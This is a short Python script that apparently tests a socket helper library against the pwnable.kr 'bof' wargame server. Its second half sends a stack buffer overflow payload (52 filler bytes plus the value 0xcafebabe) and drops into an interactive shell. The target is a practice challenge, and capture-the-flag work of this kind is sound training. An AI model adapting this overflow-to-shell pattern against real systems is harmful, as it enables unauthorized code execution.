#!/usr/bin/python
import shoe
import struct
import sys

## This run shouldn't pwn.
print("[*] Not pwning...")
s = shoe.Shoe('pwnable.kr', 9000)

resp = s.read_for(2) # Should return nothing
print(resp)

s.write("hi\n")

resp = s.read_until("me :") # Should return "overflow me :"
print(resp)

resp = s.read_until_end() # Should return "\nNah..\n"
print(resp)

s.close()

## This run should pwn.
print("[*] Pwning...")
s = shoe.Shoe('pwnable.kr', 9000)

offset = 52
pwn = "A" * offset + struct.pack("<I", 0xcafebabe)

s.write(pwn+"\n")
s.tie() # Should be able to "ls -la"
